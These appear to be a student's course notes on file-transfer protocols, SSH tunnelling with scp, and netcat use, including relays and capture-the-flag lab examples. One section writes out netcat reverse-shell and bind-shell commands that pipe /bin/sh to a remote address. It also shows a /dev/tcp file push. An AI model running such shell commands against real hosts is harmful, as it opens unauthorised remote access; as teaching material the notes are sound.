# data transfer, movement, and redirection
## data transfer
common methods for transferring data are: tftp, ftp(active and passive), sftp, scp
### tftp - trivial file transfer protocol
- rfc 1350 rev2
- udp transport
- extremely small and very simple communication
- no terminal communication ()
- insecure (no authentication or encryption)
- no directory services
- used often for tech such as BOOTP and PXE
### ftp - file transfer protocol
- rfc 959
- tcp transport
- uses multiple tcp connections
- control connection (21)/data connection (20)
- authentication through clear-text sign in (username and password)
- insecure in default configuration
- has directory services
- can be enhanced with ssl/tls(ftps)
- anonymous login
### sftp - secure file transfer protocol
- TCP transport (TCP port 22)
- Uses symmetric and asymmetric encryption
- Adds FTP like services to SSH
- Authentication through sign in (username and password) or with SSH key
- Interactive terminal access
### ftps - file transfer protocol secure
- TCP transport (TCP port 443)
- Adds SSL/TLS encryption to FTP
- Authentication with username/password and/or PKI
- Interactive terminal access
### scp - secure copy protocol
- TCP Transport (TCP port 22)
- Uses symmetric and asymmetric encryption
- Authentication through sign in (username and password) or with SSH key
- Non Interactive
- SYNTAX:   
Download a file from a remote directory to a local directory  
```$ scp student@172.16.82.106:secretstuff.txt /home/student```   
Upload a file to a remote directory from a local directory  
```$ scp secretstuff.txt student@172.16.82.106:/home/student```  
Copy a file from a remote host to a separate remote host  
```$ scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student```

notes:   
scp <user>@<ip>:<file> <destination>  
scp <target><location> (put a "." to put in pwd on your machine)  
scp<source><destination>  
  
- SCP SYNTAX W/ ALTERNATE SSHD
Download a file from a remote directory to a local directory  
```$ scp -P 1111 student@172.16.82.106:secretstuff.txt /home/student```  
Upload a file to a remote directory from a local directory    
```$ scp -P 1111 secretstuff.txt student@172.16.82.106:/home/student```     
SCP SYNTAX THROUGH A TUNNEL  
```ssh student@172.16.82.106 -L 1111:localhost:22 -NT```  
Download a file from a remote directory to a local directory  
```$ scp -P 1111 student@localhost:secretstuff.txt /home/student```  
Upload a file to a remote directory from a local directory  
```$ scp -P 1111 secretstuff.txt student@localhost:/home/student```  
  
## traffic redirection

notes:  
netcat used to banner grab to see what is really running on a port in case not the usual service is assigned to that port  
```nc 172.16.1.15 22```  

### netcat
NETCAT is the "swiss army knife" networking utility which reads and writes data across network socket connections using the 
TCP/IP protocol. It is designed to be a reliable "back end" tool that can be used directly or easily driven by other 
programs and scripts.  
Can be used for the following:  
- inbound and outbound connections, TCP/UDP, to or from any ports
- troubleshooting network connections
- sending/receiving data (insecurely)
- port scanning (similar to -sT in Nmap)
### netcat: client to listener file transfer
```
Client (sends file): nc 10.2.0.2 9001 < file.txt  
Listener (receive file): nc -l -p 9001 > newfile.txt  
```
### netcat: listener to client file transfer  
```  
Listener (sends file): nc -l -p 9001 < file.txt  
Client (receive file): nc 10.2.0.2 9001 > newfile.txt  
```  
### netcat relay demos  
on client relay:  
```  
mknod mypipe p  
nc 10.1.0.2 9002 0< mypipe | nc 10.2.0.2 9001 1> mypipe  
```  
on listener2 (sends info):  
```nc -l -p 9002 < infile.txt```  
on listener1 (receives info):  
```nc -l -p 9001 > outfile.txt```  
writes the output to listener1 and listener2 through the named pipe   

notes on netcat relay:    
pc1 nc -lp <port>  
pc3 nc -lp <port>  
pc2 nc <pc1 ip> <port> 0<pipe | nc <pc3><port> 1>pipe  
  
  
### file transfer with /dev/tcp  
on the receiving box:  
```nc -l -p 1111 > file.txt```  
on the sending box:  
```cat file.txt > /dev/tcp/10.2.0.2/1111```  
this method is useful for host that does not have NETCAT available  

### REVERSE SHELL USING NETCAT
When shelled into the remote host using -c :  
```nc -c /bin/sh <your ip> <any unfiltered port>```  
You could even pipe BASH through NETCAT.  
```/bin/sh | nc <your ip> <any unfiltered port>```
Then listen for the shell.  
```nc -l -p <same unfiltered port> -vvv```  
You can also listen using the -e with NETCAT.  
```nc -l -p <any unfiltered port> -e /bin/bash```  

ctfd examples:  
student@internet-host-student-18:~$ nc -lvp 5678 > 2steg.jpg  
student@blue-int-dmz-host-1-student-18:~$ nc -lvp 4321 0<pipe | nc 10.50.43.237 5678  1>pipe  
student@internet-host-student-18:~$ steghide extract -sf 2steg.jpg   


student@internet-host-student-18:~$ nc -lvp 5678 > 4steg.jpg  
student@blue-int-dmz-host-1-student-18:~$ nc 172.16.82.115 9876 0<pipe | nc 10.50.43.237 5678 1>pipe  
student@internet-host-student-18:~$ steghide extract -sf 4steg.jpg   


